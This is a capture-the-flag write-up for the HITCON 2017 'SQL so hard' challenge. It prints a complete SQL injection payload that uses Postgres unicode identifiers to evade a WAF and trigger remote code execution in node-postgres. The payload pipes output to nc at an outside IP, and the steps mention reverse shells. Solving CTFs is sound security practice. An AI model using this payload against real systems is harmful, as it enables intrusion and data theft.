# [SQL so hard](https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/sql-so-hard)

*[HITCON ctf 2017](https://ctf2017.hitcon.org)*

## tl;dr

`SELECT 1 FROM "\\'"` can be written as `SELECT 1 FROM U&"!005c'" UESCAPE '!'`. Change all spaces to tabs and
the WAF will be happy.

Our final exploit payload for the `username` field is:

```
','')\tON\tCONFLICT\t(username)\tDO\tUPDATE\tSET\tusername=''\tRETURNING\t1\tAS\tU&"!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&"!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&"!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&"!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f"\tUESCAPE\t'!';
```

## details

- be me
- know nothing about mysql
- know nothing about [`max_allowed_packet`](https://dev.mysql.com/doc/refman/5.7/en/packet-too-large.html)
- set up local env with postgres, node and `npm i pg@7.1.0` without mysql
- reproduce the [original vulnerability](https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability) (given as hint)
- spend hours researching unicode combining characters and diacritics
- find out unicode is not going to help
- see that we **definitely need** backslashes in the field name to exploit the vulnerable javascript literal
- start digging into `node pg`-s query parser
- learn that the field names are not parsed on the client side but are reflected from the server
- consult the PostgreSQL documentation
- find interesting [unicode quoted identifiers](https://www.postgresql.org/docs/9.5/static/sql-syntax-lexical.html#SQL-SYNTAX-IDENTIFIERS) `U&"!005c'" UESCAPE '!'`
- assemble query from `returning` clause, tabs and the above literals
- celebrate the RCE
- find out that `require` is not defined in `Function("require")()` calls in node modules
- use `process.mainModule.require`
- spend another half an hour wondering why do all the reverse shells close the connection immediately
- give up and just execute `ls /|nc xxx`
- find and execute `/readflag|nc xxx`
- `hitcon{if_you_dont_know_why_plz_check_mysql_max_allowed_packet}`
- submit, be surprised about what the flag is talking about and move on
